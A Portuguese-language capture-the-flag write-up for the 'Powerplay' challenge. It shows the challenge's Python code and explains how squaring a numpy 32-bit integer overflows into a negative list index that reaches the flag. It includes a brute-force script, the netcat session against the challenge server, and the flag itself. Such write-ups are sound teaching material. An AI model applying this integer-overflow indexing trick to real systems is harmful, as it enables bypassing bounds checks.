# WriteUp: Powerplay
## Descrição do Desafio
Categoria: misc

Descrição:
> Pump yourself up with power to get an inspirational quote.

## Solução
O arquivo disponibliza o seguinte código python.

```py
import numpy as np
from secret import flag, quotes

prizes = quotes + ['missingno'] * 4 + [flag] * 24

if __name__ == '__main__':
	print('Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!\n')
	player_count = int(input('How many players participate?\n'))
	power = np.zeros(player_count, dtype = np.int32)
	for i in range(player_count):
		power[i] = int(input(f'Player {i}, how strong are you right now?\n'))
	ready = False

	while True:
		print('What do you want to do?\n1) pump up\n2) cash in')
		option = int(input())
		if option == 1:
			power = power**2
			ready = True
		elif option == 2:
			if not ready:
				raise Exception('Nope, too weak')
			for i in range(player_count):
				if power[i] < len(quotes):
					print(f'You got an inspiration: {prizes[power[i]]}')
			exit()
		else:
			raise Exception('What?')

```
Analisando esse código, podemos ver que há um vetor `prizes` que contém várias strings e a flag 24 vezes no final, então, precisamos acessar alguma dessas posições em que a flag está.

Observando o funcionamento do código, é primeiro pedido do usuário a quantidade de jogadores e a "força" de cada jogador, após isso, o usuário pode escolher duas opções. A primeira opção "pump up" eleva todos as "forças" de todos os jogadores ao quadrado e a segunda opção "cash in" acessa uma posição do vetor prizes, porém, so irá acessar a posição caso a "força" do jogador seja menor que a quantidade de strings no vetor "quotes".

Portanto, precisamos escolher uma "força" que, ao elevar ao quadrado, resulte em uma posição em que a flag está no vetor de `prizes`, porém, como o vetor `prizes` contém todas as strings de `quotes` e o código não deixa
o usuário acessar alguma posição que seja maior que o tamanho de `quotes`, não podemos acessar as posições que a flag está de maneira tradicional.

Para passar por essa verificação, podemos usar uma propriedade da linguagem python que é os índices negativos.

```py
v[-1] # Última posição
v[-2] # Penúltima posição
v[-3] # Antepenúltima posição
```

Desse modo, precisamos acessar alguma posição entre `-1` e `-24`, que são as posições em que a flag se encontra. Porém, precisamos de algum número que, elevado ao quadrado, resulta em um número nesse intervalo. 
Podemos fazer isso utilizando `integer overflow`.

```py
power = np.zeros(player_count, dtype = np.int32)
```

Como a variável `power` é definido commo um int de 32 bits, podemos encontrar algum número que, elevado ao quadrado, passa do valor máximo de inteiros de 32 bits e resulta em um número negativo. Para fazer isso,
podemos fazer um script simples que testa todos os números de `0` até o maior inteiro possível de 32 bits e verifica se esse número ao quadrado se encaixa no intervalo de `-24` a `-1`.

```py
import numpy as np

def encontra_indice():
    for i in range(2147483647): # Ate maior valor inteiro possivel
        i2 = np.int32(i) ** 2   # Elevando ao quadrado
        if i2 >= np.int32(-24) and i2 < 0: # Verificando se esta no intervalo -24 a -1
            return i, i2

indice, indiceQuadrado = encontra_indice()
print("Número encontrado " +  str(indice))
print(str(indice) + " ao quadrado = " + str(indiceQuadrado))
```

Ao rodar esse script, obtemos o seguinte output.

```
Número encontrado 34716455
34716455 ao quadrado = -15
```

Agora, basta apenas conectar ao servidor e usar esse número como "força" de qualquer jogador

```shell
root@DESKTOP-4IEKTFM:/mnt/c/Users/Caio/Desktop# nc 52.59.124.14 5016
Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!

How many players participate?
1
Player 0, how strong are you right now?
34716455
What do you want to do?
1) pump up
2) cash in
1
What do you want to do?
1) pump up
2) cash in
2
You got an inspiration: ENO{d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve}
```

### Flag: `ENO{d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve}`
